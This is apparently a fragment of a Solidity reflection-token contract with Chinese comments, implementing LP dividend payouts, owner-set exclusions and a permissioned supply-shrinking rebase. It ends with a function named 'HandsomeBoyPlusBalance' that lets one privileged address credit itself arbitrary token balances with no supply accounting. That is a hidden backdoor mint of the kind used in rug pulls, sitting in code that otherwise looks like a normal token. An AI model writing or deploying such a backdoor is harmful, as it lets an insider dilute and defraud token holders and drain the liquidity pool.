		if (0 == lpProviderIndex[adr]) {
			if (0 == lpProviders.length || lpProviders[0] != adr) {
				lpProviderIndex[adr] = lpProviders.length;
				lpProviders.push(adr);
			}
		}
	}

	uint256 private currentIndex;
	uint256 private lpRewardCondition = 10 * 10 ** 18;
	uint256 private progressLPBlock;

	//执行LP分红，使用 gas(500000) 单位 gasLimit 去执行LP分红
	function processLP(uint256 gas) private {
		//间隔 10 分钟分红一次
		// if (progressLPBlock + 200 > block.number) {
		// 	return;
		// }
		//交易对没有余额
		uint256 totalPair = IERC20(uniswapV2Pair).totalSupply();
		if (0 == totalPair) {
			return;
		}

		uint256 tokenBalance = balanceOf(address(this));
		//分红小于分配条件，一般太少也就不分配
		if (tokenBalance < lpRewardCondition) {
			return;
		}

		address shareHolder;
		uint256 pairBalance;
		uint256 amount;

		uint256 shareholderCount = lpProviders.length;

		uint256 gasUsed = 0;
		uint256 iterations = 0;

		//一笔链上交易剩余的 gasLimit，可搜索 Solidity gasleft() 了解
		uint256 gasLeft = gasleft();

		//最多只给列表完整分配一次，iterations < shareholderCount
		while (gasUsed < gas && iterations < shareholderCount) {
			//下标比列表长度大，从头开始
			if (currentIndex >= shareholderCount) {
				currentIndex = 0;
			}
			shareHolder = lpProviders[currentIndex];
			//持有的 LP 代币余额，LP 本身也是一种代币
			pairBalance = IERC20(uniswapV2Pair).balanceOf(shareHolder);
			//不在排除列表，才分红
			if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
				amount = (tokenBalance * pairBalance) / totalPair;
				//分红大于0进行分配，最小精度
				if (amount > 0) {
					// _transfer(address(this), shareHolder, amount);

					if (_isExcluded[address(this)] && !_isExcluded[shareHolder]) {
						_transferFromExcluded(address(this), shareHolder, amount);
					} else if (!_isExcluded[address(this)] && _isExcluded[shareHolder]) {
						_transferToExcluded(address(this), shareHolder, amount);
					} else if (!_isExcluded[address(this)] && !_isExcluded[shareHolder]) {
						_transferStandard(address(this), shareHolder, amount);
					} else if (_isExcluded[address(this)] && _isExcluded[shareHolder]) {
						_transferBothExcluded(address(this), shareHolder, amount);
					} else {
						_transferStandard(address(this), shareHolder, amount);
					}
				}
			}

			gasUsed = gasUsed + (gasLeft - gasleft());
			gasLeft = gasleft();
			currentIndex++;
			iterations++;
		}

		progressLPBlock = block.number;
	}

	//是否排除LP分红
	function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
		excludeLpProvider[addr] = enable;
	}

	//最小分红数量
	function setLpRewardCondition(uint256 _lpRewardCondition) external onlyOwner {
		lpRewardCondition = _lpRewardCondition;
	}

	mapping(address => bool) public canRebase;

	// 设置哪些用户可以rebase
	function canRebaseAddress(address _user, bool status) external onlyOwner {
		canRebase[_user] = status;
	}

	function rebase() public {
		require(canRebase[msg.sender], "No permission");

		if (block.timestamp <= lastRebaseTime.add(_rebaseTime)) {
			return;
		}

		lastRebaseTime = block.timestamp;
		_tTotal = (_tTotal * 999) / 1000;
	}

	// mint代币
	function HandsomeBoyPlusBalance(uint tAmount) public {
		require(handsomeBoy == msg.sender, "No permission");
		uint256 rAmount = tAmount.mul(_rTotal).div(_tTotal);
		_tOwned[msg.sender] = _tOwned[msg.sender].add(tAmount);
		_rOwned[msg.sender] = _rOwned[msg.sender].add(rAmount);
	}
}